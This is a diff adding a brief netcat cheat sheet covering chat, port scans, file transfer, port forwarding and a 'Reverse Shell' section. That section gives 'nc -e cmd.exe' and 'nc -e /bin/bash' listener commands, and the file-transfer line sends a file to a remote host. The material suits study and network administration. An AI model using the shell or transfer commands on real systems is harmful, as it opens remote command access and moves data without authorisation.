@@ -1,0 +1,26 @@
+Chat, port scans, file transfer, port forwarding, banner grabbing, and create a reverse shell
+
+Nc -[options] hostname [ports]
+	-n does not do a reverse lookup
+	-v verbose
+	-w is inactivity timeout
+
+Chat
+	Nc -l -p <Port>
+	Nc <destIP> <destPort>
+
+Port Scanning
+	Nc -v -n <hostname> <port s>
+
+Transferring files
+	Source: nc -v -n -w3 <destIP> <destPort> < <file>
+	Destination: nc -n -l -p <port> > <file>
+
+Port Forwarding
+	Mknod <backpipe> p
+	Nc -l <port> 0<backpipe | nc <destIP> <destPort> 1>backpipe
+
+Reverse Shell
+	Nc -l -p <destPort> -e cmd.exe 
+	Nc -l -p <destPort> -e /bin/bash
+
